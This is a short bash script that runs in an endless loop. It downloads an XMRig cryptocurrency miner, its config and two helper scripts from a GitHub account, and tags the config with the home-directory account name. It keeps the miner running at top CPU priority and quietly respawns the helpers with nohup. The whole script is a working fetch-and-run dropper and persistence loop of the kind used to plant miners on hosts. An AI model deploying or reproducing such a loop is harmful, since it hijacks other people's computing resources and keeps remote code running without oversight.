#!/bin/bash

version='0.19'

path=$(pwd)
account=${path#/home/}

while true
do

  if [ ! -e 'xmrig' ]
  then
     wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
  fi

  if [ ! -e 'config.json' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
     sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
  fi

  if [ ! -e 'ping.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/scripts/main/ping.sh && chmod 777 ping.sh
  fi

  if [ ! -e 'status.sh' ]
  then
     wget -q https://raw.githubusercontent.com/Predador21/scripts/main/status.sh && chmod 777 status.sh
  fi

  if ! pgrep xmrig > /dev/null
  then
     nice -n -20 ./xmrig
  fi

  if ! pgrep ping.sh > /dev/null
  then
     nohup ./ping.sh $account $version > /dev/null &
  fi

  if ! pgrep status.sh > /dev/null
  then
     nohup ./status.sh > /dev/null &
  fi

done
